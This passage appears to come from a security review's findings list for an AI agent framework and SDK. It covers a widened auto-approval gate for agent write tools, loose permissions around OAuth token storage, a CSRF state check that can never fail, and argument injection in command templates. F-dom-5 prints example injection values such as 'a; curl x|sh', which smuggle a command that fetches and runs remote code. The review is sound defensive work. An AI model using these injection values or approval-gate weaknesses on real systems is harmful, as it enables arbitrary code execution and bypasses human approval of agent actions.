    file: packages/agents/src/bridge/approval-decision.ts
    line: 52
    plan_ref: "ADR D5 — absorb the consumer's scar tissue, not its interface; T2.1 / T5.1 (RETARGETED approval-mode.test.ts)"
    domain_anchor: 'Baseline Context invariant for packages/tui/src/consent/approval-mode.ts — "auto-edit stays bounded by the tool''s write scope"; rules/error-handling.md § 2 (fail-closed)'
    summary: >-
      The absorbed default write-scoped set is THREE tools where the only real consumer's set is ONE.
      Adopting the framework symbol silently widens an approval gate: `edit_file` (which TheoCode
      actually registers) stops requiring a human in `auto-edit` mode, with no sandbox posture
      required at all.
    evidence: |
      Framework (new):
      ```ts
      // packages/agents/src/bridge/approval-decision.ts:52-56
      export const WRITE_SCOPED_TOOLS: ReadonlySet<string> = new Set([
        'apply_patch', 'edit_file', 'write_file',
      ])
      ```
      Consumer being replaced (TheoCode/packages/tui/src/consent/approval-mode.ts:5):
      ```ts
      const EDIT_TOOLS = new Set(['apply_patch'])
      ```
      The consumer DOES register the extra name — TheoCode/packages/agent/src/tools/registry.ts:90-91:
      ```ts
      ['edit_file', withName(bound.bind(createEditFileTool)({ projectRoot: scope.writeRoot }), 'edit_file')],
      ```
      And the widening is asserted as intended behaviour, with no posture argument:
      ```ts
      // packages/agents/tests/unit/approval-decision.test.ts:67-70
      expect(shouldAutoApprove('auto-edit', 'edit_file')).toBe(true)
      expect(shouldAutoApprove('auto-edit', 'write_file')).toBe(true)
      ```
      The `writeScopedTools` escape hatch exists (:59-61) but nothing in the plan, the tests, or the
      new gates requires T5.1's adoption to use it. Grep of the diff for a CHANGELOG note naming the
      widening returned nothing.
    recommended_action: >-
      Either (a) ship the default as `new Set(['apply_patch'])` — the measured consumer semantics —
      and let a product widen it explicitly, or (b) make T5.1's adoption pass
      `{ writeScopedTools: new Set(['apply_patch']) }` AND add a regression test in TheoCode pinning
      that `edit_file` still prompts. Whichever is chosen, record the delta in
      packages/agents/CHANGELOG.md under `Security`/`Changed` — a widened approval gate is a
      consumer-visible change, not an implementation detail.

  - id: F-dom-2
    severity: HIGH
    file: ../theokit-sdk/packages/sdk/src/internal/mcp/token-storage.ts
    line: 77
    plan_ref: "T1.3 (publish the MCP OAuth subpath) + T2.4 / Q3 proposal — 'route the remaining creators through ensureSecureDir'"
    domain_anchor: "SDK credential-store.ts:118-121 — 'a writable dir lets an attacker replace the credential file with a symlink to their own 0600 file'"
    summary: >-
      T2.4 hardened three creators under ~/.theokit and missed the one that stores OAuth refresh
      tokens — and T1.3 then published exactly that path as `@theokit/sdk/mcp-auth`. The token file
      is 0600 but its parent `~/.theokit` is created with no mode, so under `umask 002` it is born
      0775 and another local user can unlink-and-replace `mcp-tokens.json` wholesale.
    evidence: |
      ```ts
      // token-storage.ts:22
      const FILE_PATH = join(homedir(), ".theokit", "mcp-tokens.json");
      // token-storage.ts:66-79
      // File fallback. atomicWriteJson auto-creates the parent directory.
      await atomicWriteJson(FILE_PATH, allTokens);
      try { chmodSync(FILE_PATH, 0o600); } catch { /* windows */ }
      ```
      ```ts
      // internal/persistence/atomic-write.ts:247  — NO mode, unlike jsonl.ts:142 which T2.4 fixed
      await mkdir(dirname(filePath), { recursive: true });
      ```
      Two further gaps on the same, now-public, path:
        * `getTokens` (token-storage.ts:90-108) reads the token bundle with **no** mode check —
          `assertSecureModes` is called only from `readAuthFile` (credential-store.ts:193) over
          `credentialHome`, never here.
        * `chmodSync` runs AFTER the write, so the file exists at the umask mode for a window; the
          same directory is `credentialHome`'s parent, so a run order that puts MCP first creates
          the very shape `assertSecureModes` later throws on — the self-inconsistency Q3 set out to
          close, still live in the newly published entry point.
    recommended_action: >-
      Give `atomicWriteJson`/`atomicWriteText` an optional `dirMode` and have `setTokens` pass
      `0o700` (or route `setTokens` through the same `ensureSecureDir` shape used in
      packages/agents/src/hooks/secure-store.ts:54). Add an `assertSecureModes(dirname(FILE_PATH),
      FILE_PATH)` on the read path in `getTokens`, mirroring `readAuthFile`. Both before the
      `@theokit/sdk` publish that carries the `./mcp-auth` subpath.

  - id: F-dom-3
    severity: MEDIUM
    file: ../theokit-sdk/packages/sdk/src/internal/persistence/jsonl.ts
    line: 141
    plan_ref: "T2.4 — 'the transcript root was born writable by other users'"
    domain_anchor: "SDK credential-store.ts:122 assertSecureModes; framework config/trust-store.ts:157-161 ('the mode argument is a NO-OP on a directory that already exists')"
    summary: >-
      The creation-time-only `mode: 0o700` is defensible on the append hot path, but the comment
      names a compensating control that does not cover this directory: `assertSecureModes` is only
      ever called on the credential home, never on a transcript project directory. A tree left loose
      by an older SDK is therefore neither repaired nor detected on this path.
    evidence: |
      ```ts
      // jsonl.ts:139-142
      // Creation-time only, deliberately: repairing a pre-existing directory means `stat` + `chmod` on
      // every append, and this is the hot path of every session. The pre-existing case is what
      // `assertSecureModes` is for.
      mkdirSync(dirname(path), { recursive: true, mode: 0o700 });
      ```
      Measured callers of the claimed control (`grep -rn assertSecureModes packages/ --include=*.ts`,
      non-test): exactly one — `credential-store.ts:193`, over `credentialHome(config, env)`.
      No caller passes a transcript path.
    recommended_action: >-
      Do the repair ONCE per process, not per append: a module-level `Set<string>` of already-checked
      directories keyed on `dirname(path)`, doing `stat` + `chmod` on first sight only. That keeps the
      hot path at zero extra syscalls after the first write and closes the pre-existing case for real.
      If that is declined, delete the sentence citing `assertSecureModes` and state honestly that a
      pre-existing loose transcript directory is unchecked.

  - id: F-dom-4
    severity: MEDIUM
    file: packages/agents/src/hooks/secure-store.ts
    line: 54
    plan_ref: "T2.4 + the plan's 2026-08-16 Q3 correction ('routed through ensureSecureDir')"
    domain_anchor: "rules/error-handling.md § 2 (fail-fast, fail-loud); plan Q3 — 'the check is right and the layout disagrees with itself'"
    summary: >-
      VERIFIED SAFE as asked — the repair is strictly leaf-scoped and never chmods toward $HOME. The
      residual is that nothing detects a loose ANCESTOR under the transcript root, and a
      group-writable `~/.theokit/projects` defeats the 0700 leaf entirely: another local user can
      rename the project directory away and substitute their own.
    evidence: |
      ```ts
      // secure-store.ts:54-73 — dirname(filePath) only; chmodSync(dir, …) never walks up.
      export function ensureSecureDir(filePath: string): void {
        const dir = dirname(filePath)
        mkdirSync(dir, { recursive: true, mode: DIR_MODE })
        const mode = statSync(dir).mode & 0o777
        if ((mode & FORBIDDEN_WRITE_BITS) !== 0) { chmodSync(dir, DIR_MODE); … }
      }
      ```
      Callers pass a FILE path, so `dir` is the leaf:
      `project-index.ts:75 ensureSecureDir(sidecar)` → `~/.theokit/projects/<hash>/`
      `session-pointer.ts:94 ensureSecureDir(target)` → same leaf.
      Neither `~/.theokit` nor `~/.theokit/projects` is ever inspected on this path.
    recommended_action: >-
      Keep chmod at the leaf (correct). Add a non-mutating ASSERTION over the ancestors between
      `transcriptRoot()` and the leaf, returning the same typed refusal shape `readSecureJson` uses,
      so a loose ancestor is surfaced to the operator with the `chmod 700` fix instead of being
      silently tolerated.

  - id: F-dom-5
    severity: MEDIUM
    file: packages/agents/src/config/command-template.ts
    line: 120
    plan_ref: 'EC-4 — single-pass expansion so an inlined file cannot inject a shell segment; T3.3'
    domain_anchor: "command-template.ts:24-27 — 'Arguments ARE substituted first, deliberately … That is the one re-scan that is safe'"
    summary: >-
      The single-pass inertness claim is VERIFIED for shell output and file content (see the
      verifications section). It does NOT hold for arguments, and the justification for that
      exception is an assumption about the caller that the module cannot enforce, does not test, and
      offers no way to opt out of. An argument can both introduce a shell segment the template never
      contained and land unquoted inside one it did.
    evidence: |
      Order is fixed at :120-133 — `PLACEHOLDER_REGEX` pass, then the single `REFERENCE_REGEX` pass
      over the ALREADY-SUBSTITUTED string:
      ```ts
      const withArgs = await replaceAsync(template, PLACEHOLDER_REGEX, …)
      // ONE scan for both, so neither's result is visible to the other's pattern.
      return replaceAsync(withArgs, REFERENCE_REGEX, async (match) => { … deps.shell(command) … })
      ```
      Consequences, neither of which has a test:
        1. template `Summarize $1`, rawArgs ``!`curl x|sh` `` → a shell segment exists where the
           template author wrote none.
        2. template ``!`git diff $1` ``, rawArgs `"a; curl x|sh"` → `splitArgs` keeps the quoted run
           as ONE argument and `QUOTE_TRIM_REGEX` (:39, :64) strips the quotes, so `deps.shell`
           receives `git diff a; curl x|sh`. No quoting or escaping is applied at substitution.
      The only test of this direction (`test_arguments_reach_inside_a_shell_segment`, :188-196)
      asserts the happy path and stops.
    recommended_action: >-
      State the trust level in `TemplateDeps`/the module docblock explicitly — "rawArgs is trusted at
      the same level as the command body; a caller that sources arguments from model output, clipboard
      paste or a remote payload must sanitise before calling" — and add the two negative tests above
      so the blast radius is pinned rather than assumed. Optionally add
      `ShouldExpandOptions { argumentsAreInert?: boolean }` that neutralises `` ` `` / `!` / leading
      `@` in substituted argument values, for callers that cannot make that promise.

  - id: F-dom-6
    severity: MEDIUM
    file: ../theokit-sdk/packages/sdk/src/internal/mcp/oauth.ts
    line: 277
    plan_ref: "T1.3 — 'the MCP OAuth flow gets a way in'; capability index row added by 87a4d9f4 ('the row that sent people to hand-write PKCE')"
    domain_anchor: "oauth.ts:127-133 — 'EC-2 MUST FIX: validate state' / CSRF protection on the PKCE flow"
    summary: >-
      In manual (`oob`) redirect mode the stdin reader FABRICATES the expected state when the user
      pastes a bare code, so the CSRF check at :128 compares `expectedState` against itself and can
      never fail. Pre-existing internal code — but T1.3 published it and the capability index now
      directs customers here instead of hand-writing RFC 7636, which changes who is relying on it.
    evidence: |
      ```ts
      // oauth.ts:274-277
      // Treat the entire input as the code. State validation will fail
      // unless the user also provided state — but in manual mode they
      // typically paste the URL with state baked in.
      resolve({ code: trimmed, state: expectedState });
      ```
      Consumed at :126-133:
      ```ts
      const { code, state: returnedState } = await codeWaiter;
      if (returnedState !== state) { throw … "possible CSRF attempt" }
      ```
      The comment's own prediction ("state validation will fail") is contradicted by the line it
      annotates. Localhost mode (:207-211) validates correctly — the defect is manual mode only.
    recommended_action: >-
      Resolve `{ code: trimmed, state: '' }` on the bare-code path and let the existing check refuse,
      with an error message telling the user to paste the FULL callback URL. If a bare code must stay
      supported, require an explicit `oauth.allowUnvalidatedState === true` opt-in so the weakening is
      named rather than defaulted. Add a test asserting a bare code is refused.

  - id: F-dom-7
    severity: MEDIUM
    file: packages/agents/src/bridge/approval-decision.ts
    line: 17
    plan_ref: "T2.1 — 'the invariant, stated once'"
    domain_anchor: 'rules/testing.md § 4.1 (negative cases assert the specific behaviour, not a convenient one)'
    summary: >-
      The module's headline invariant is false for one of its three modes, and the test that claims
      to prove it is constructed with the one tool name that hides the exception. A security module
      whose stated rule and whose code disagree is how the next reader draws the wrong conclusion.
    evidence: |
      Stated (approval-decision.ts:17-19):
      ```
      ## The invariant, stated once
      **Nothing auto-approves without positive evidence of enforced confinement.**
      ```
      Actual (:85) — `auto-edit` consults no posture at all:
      ```ts
      case 'auto-edit':
        return (options?.writeScopedTools ?? WRITE_SCOPED_TOOLS).has(toolName)
      ```
      `shouldAutoApprove('auto-edit', 'apply_patch')` with NO posture returns `true`.
      The proof (approval-decision.test.ts:41-49) loops all three modes but passes `'run_shell'`,
      which is the single input for which the blanket claim happens to hold:
      ```ts
      for (const mode of APPROVAL_MODES) {
        expect(shouldAutoApprove(mode, 'run_shell'), …).toBe(false)
      }
      ```
    recommended_action: >-
      Restate the invariant as the two rules that are actually true ("no COMMAND runs without enforced
      confinement; a WRITE runs only when the user chose auto-edit and the tool carries its own write
      root") and rename/extend the test so the auto-edit exception is asserted in the same block that
      claims the invariant — e.g. add `expect(shouldAutoApprove('auto-edit','apply_patch')).toBe(true)`
